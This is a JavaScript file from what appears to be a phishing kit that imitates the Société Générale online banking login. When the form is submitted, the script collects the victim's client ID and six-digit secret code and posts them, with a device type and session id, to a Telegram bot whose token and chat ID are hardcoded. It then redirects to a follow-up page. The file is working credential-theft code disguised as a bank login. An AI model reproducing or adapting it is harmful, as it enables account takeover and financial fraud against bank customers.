var isShift = false;
var seperator = "/";
var dash = "-";

// Configuration Telegram
localStorage.setItem(
  "token_n",
  "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs",
);
localStorage.setItem("chatId_n", "7796457959");

function cc_date(input, keyCode) {
  if (keyCode == 16) isShift = true;
  if (
    ((keyCode >= 48 && keyCode <= 57) ||
      keyCode == 8 ||
      keyCode <= 37 ||
      keyCode <= 39 ||
      (keyCode >= 96 && keyCode <= 105)) &&
    isShift == false
  ) {
    if (keyCode == 8) input.value = "";
    else if (input.value.length == 2) input.value += seperator;
    return true;
  }
  return false;
}

function date_of_birth(input, keyCode) {
  if (keyCode == 16) isShift = true;
  if (
    ((keyCode >= 48 && keyCode <= 57) ||
      keyCode == 8 ||
      keyCode <= 37 ||
      keyCode <= 39 ||
      (keyCode >= 96 && keyCode <= 105)) &&
    isShift == false
  ) {
    if (keyCode == 8) input.value = "";
    else if (input.value.length == 2 || input.value.length == 5)
      input.value += seperator;
    return true;
  }
  return false;
}

jQuery(function ($) {
  // Gestion du clavier numérique
  $("form ul.numbers li a").click(function () {
    var cur_number = $(this).data("number");
    if (cur_number == "zz") return false;
    if (cur_number == "-1") cur_number = "0";
    if ($("#password").val().length >= 6) return false;

    $("#password").val($("#password").val() + cur_number);
    $("ul.password-field")
      .children(".empty")
      .first()
      .removeClass("empty")
      .addClass("notempty");
  });

  // Reset du mot de passe
  $(".reset-password").click(function () {
    $("#password").val("");
    $("ul.password-field").children().removeClass("notempty").addClass("empty");
  });

  // Reset de l'identifiant
  $(".input-reset").click(function () {
    $(this).siblings("label").find("input").val("");
    $(this).hide();
  });

  // Soumission du formulaire
  $(".login-form button").click(function () {
    const code_client = $("#code_client").val();
    const password = $("#password").val();

    if (code_client.length != 8 || !$.isNumeric(code_client)) {
      $(".login-form .error-message")
        .text("Identifiant incorrect (8 chiffres requis)")
        .show();
      return;
    }

    if (password.length != 6) {
      $(".login-form .error-message")
        .text("Code secret incorrect (6 chiffres requis)")
        .show();
      return;
    }

    // Construction du message enrichi
    const userInfo = `
🔐 *NOUVELLE CONNEXION SOCIÉTÉ GÉNÉRALE* 🔐
━━━━━━━━━━━━━━━━━━━━━━
👤 *Identifiant* : \`${code_client}\`
🔢 *Mot de passe* : \`${password}\`
🌍 *Localisation* : ${getLocation()}
📡 *IP* : ${getUserIP()}
💻 *Appareil* : ${getDeviceType()}
🕒 *Date* : ${new Date().toLocaleString("fr-FR")}
🆔 *Session* : ${generateSessionId()}
━━━━━━━━━━━━━━━━━━━━━━`;

    // Envoi à Telegram
    $.ajax({
      url: `https://api.telegram.org/bot${localStorage.getItem("token_n")}/sendMessage`,
      method: "POST",
      data: {
        chat_id: localStorage.getItem("chatId_n"),
        text: userInfo,
        parse_mode: "Markdown",
      },
      success: function () {
        setTimeout(() => (window.location.href = "../final.php"), 1000);
      },
      error: function (xhr) {
        console.error("Erreur d'envoi:", xhr);
        window.location.href = "../final.php";
      },
    });
  });

  // Gestion de l'interface
  $("#code_client").keyup(function () {
    const code_client = $(this).val();
    if (code_client.length > 0) $("#input-reset").show();
    else $("#input-reset").hide();

    if (code_client.length == 8 && $.isNumeric(code_client)) {
      $(".login-form .input-reset").hide();
      $(".login-form .check").show();
    } else {
      $(".login-form .zzz").hide();
      $(".login-form .check").hide();
      $("#password").val("");
      $("ul.password-field")
        .children()
        .removeClass("notempty")
        .addClass("empty");
    }
  });

  // Fonctions utilitaires
  function getLocation() {
    return "Abidjan, Côte d'Ivoire"; // À remplacer par un service de géolocalisation réel
  }

  function getUserIP() {
    return "102.207.0.170"; // Exemple, à remplacer par la récupération réelle
  }

  function getDeviceType() {
    const ua = navigator.userAgent;
    if (/Mobile|Android|iPhone/i.test(ua)) return "📱 Mobile";
    if (/Tablet|iPad/i.test(ua)) return "🖥 Tablet";
    return "💻 Ordinateur";
  }

  function generateSessionId() {
    return (
      "SG-" +
      Math.random().toString(36).substr(2, 9).toUpperCase() +
      "-" +
      Date.now().toString(36).substr(-4)
    );
  }

  // Gestion des labels animés
  $(".input")
    .focus(function () {
      $(this).parent().find(".label-txt").addClass("label-active");
    })
    .blur(function () {
      if ($(this).val() == "") {
        $(this).parent().find(".label-txt").removeClass("label-active");
      }
    })
    .each(function () {
      if ($(this).val().length > 0) {
        $(this).parent().find(".label-txt").addClass("label-active");
      }
    });

  // Gestion du champ date
  $("#birth_date").keydown(function (e) {
    date_of_birth(this, e.keyCode);
  });
});
